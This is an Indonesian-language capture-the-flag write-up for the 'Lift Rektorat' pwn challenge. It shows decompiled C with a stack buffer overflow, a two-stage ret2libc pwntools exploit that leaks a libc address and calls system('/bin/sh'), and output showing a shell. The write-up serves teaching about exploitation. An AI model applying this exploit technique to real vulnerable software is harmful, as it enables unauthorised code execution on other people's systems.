+++
title = "AgriHack 0x2 - Lift Rektorat Writeup"
date = "2017-11-24 00:38:01"
categories = ["pwn", "writeup"]
+++

> _**Lift Rektorat (300 pts)**_ Kamu sedang berada direktorat karena kamu hendak menemui rektor karena kamu ditunjuk menjadi kepala keamanan cyber di IPB. Tiba-tiba terjadi sebuah insiden yang membuat kamu tersadar, bahwa bahkan lift rektorat memiliki celah untuk dieksploitasi. Tunjukkan bagaimana kamu mengeksploitasi celah tersebut. -- binary --

_**Solusi:**_ Diberikan binary ELF 32-bit dengan NX bit enabled dan tanpa stack canary. Dapat di-_ramal-_kan sekiranya soal ini di_solve_ dengan return to libc karena stack sendiri tidak dapat dieksekusi.

```C
unsigned int danger()
{
  char s; // [esp+Eh] [ebp-4Ah]

  strcpy(aSelamatDatangD, "|            Peringatan Bahaya Lift Berhenti Berfungsi                |");
  strcpy(aSilahkanMasuka, "|              Silahkan Kirimkan Pesan Kepada Petugas                 |");
  cetak(0);
  puts("|--------------------||-------------||------------||------------------|");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|____________________||-------------||------------||__________________|");
  printf("Pesan : ");
  fgets(&s, 200, stdin);
  strcpy(aSelamatDatangD, "|                        Pesan Terkirim                               |");
  strcpy(aSilahkanMasuka, "|            Silahkan Menunggu Sejenak dan Tetap Tenang               |");
  cetak(0);
  puts("|--------------------||-------------||------------||------------------|");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|                    ||             ||            ||                  |");
  puts("|____________________||-------------||------------||__________________|");
  return sleep(5u);
}

int __cdecl main(int argc, const char \*\*argv, const char \*\*envp)
{
  int v3; // ST08_4
  int v4; // ST0C_4
  int v6; // [esp-4h] [ebp-28h]
  int v7; // [esp+0h] [ebp-24h]
  char v8; // [esp+7h] [ebp-1Dh]
  int i; // [esp+8h] [ebp-1Ch]
  int *v10; // [esp+14h] [ebp-10h]

  v10 = &argc;
  setvbuf(stdout, 0, 2, 0);
  cetak(0);
  if ( !__isoc99_scanf("%d", &v7, v3, v4, v6, v7) || v7 > 12 )
  {
    strcpy(aSelamatDatangD, "|                          Mohon Maaf                                 |");
    strcpy(aSilahkanMasuka, "|                 Lantai yang Anda Masukan Salah                      |");
    cetak(0);
    puts("|--------------------||-------------||------------||------------------|");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|____________________||-------------||------------||__________________|");
    exit(0);
  }
  do
    v8 = getchar();
  while ( v8 != 10 && v8 != -1 );
  strcpy(aSelamatDatangD, "|                     Bogor Agricultural University                   |");
  strcpy(aSilahkanMasuka, "|                     Searching and Serving The Best                  |");
  for ( i = 1; i <= v7; ++i )
  {
    sleep(2u);
    byte_804B0C4[5 * i - 2] = ' ';
    byte_804B0C4[5 * i + 2] = ' ';
    byte_804B0C4[5 * (i + 1) + 2] = '|';
    byte_804B0C4[5 * (i + 1) - 2] = '|';
    cetak(i);
    puts("|--------------------||-------------||------------||------------------|");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|                    ||             ||            ||                  |");
    puts("|____________________||-------------||------------||__________________|");
    if ( i == 7 )
    {
      danger();
      strcpy(aSelamatDatangD, "|                     Bogor Agricultural University                   |");
      strcpy(aSilahkanMasuka, "|                     Searching and Serving The Best                  |");
    }
  }
  cetak(i - 1);
  puts("|--------------------||                           ||------------------|");
  puts("|                    ||                           ||                  |");
  puts("|                    ||                           ||                  |");
  puts("|                    ||                           ||                  |");
  puts("|                    ||                           ||                  |");
  puts("|                    ||                           ||                  |");
  puts("|                    ||                           ||                  |");
  puts("|____________________||                           ||__________________|");
  return 0;
}
```

Terlihat kalau dalau dari source code, fungsi `danger` ada bug klasik stack buffer overflow pada fungsi fgets, yang me-overflow- `char s`. `danger` sendiri dipanggil saat iterasi i ke-7, user juga dapat mengontrol sampai berapa iterasi dilaksanakan. Lanjut ke permasalahan kedua, saved EIP bisa dikontrol dengan stack buffer overflow, tapi mau return kemana? return2libc perlu leaked libc address. Nah, teringat kalau binary ini adalah 32-bit jadi gaperlu repot-repot setup ROP yang terlihat magis, tinggal push GOT puts ke stack, trus print dengan menggunakan PLT puts _lagi_. Agar exploit berlanjut terus jangan lupa untuk return ke fungsi `danger` lagi untuk lanjut ke Stage ke-2 yakni return ke system dan exec /bin/sh. system address bisa dikalkulasi dengan bantuan libcdb. Dengan demikian strategi yang bisa ditulis pada code,

1.  Leak libc address, dengan push alamat suatu GOT lalu memanggil puts dan kembali ke danger
2.  Kalkulasi system dan /bin/sh dari libc address
3.  Input buffer == junk[78] + system + char junk[4] +  binsh
4.  profit

Berikut codenya,

```python
#!/usr/bin/python2
from pwn import *
r = process(['./lift_rektorat'])
lift = ELF('./lift_rektorat')

log.info('--------- STAGE 1 ---------')

buf = "A" * 78 #junk
buf += p32(lift.plt['puts']) # call puts
buf += p32(lift.symbols['danger']) # return back to danger
buf += p32(lift.got['puts']) # GOT

r.sendline("7") # control the iteration
r.sendline(buf)
r.recvuntil('Pesan Terkirim')
r.recvuntil('|____________________||-------------||------------||__________________|')
r.recvline()

log.info('--------- STAGE 2 ---------')

libc_puts = int(u32(r.recvn(4))) # leaked libc address
# local libc, saelo's vm ctfbox, Ubuntu 14.04.5 LTS, vagrant
puts_offset = 0x00064da0
system_offset = 0x0003fe70
str_bin_sh_offset = 0x0015ff0c

libc_base = libc_puts - puts_offset
libc_system = libc_base + system_offset
libc_bin_sh = libc_base + str_bin_sh_offset

buf = "A" * 78 # junk
buf += p32(libc_system)
buf += "DEAD" # junk
buf += p32(libc_bin_sh)

r.sendline(buf)
r.interactive()
```

_**$profit**_

```
[+] Starting local process './lift_rektorat': pid 5802
[*] '/home/vagrant/ctf/agrihack0x2/lift_rektorat'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] --------- STAGE 1 ---------
[*] --------- STAGE 2 ---------
[*] Switching to interactive mode
\x86\x84\x0�    ]��a��`�
[..redacted..]
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$ whoami
vagrant
```

_**Solved!**_

* * *

Sedikit cerita dibalik penemuan flag pada soal kali ini, sebelum saya mengerjakan soal ini sendiri, saya belum paham apa itu ROP dan berbagai macam permasalahan pada soal disini. **Lesson learned:** 32-bit calling convention, ret2libc, simple ROP.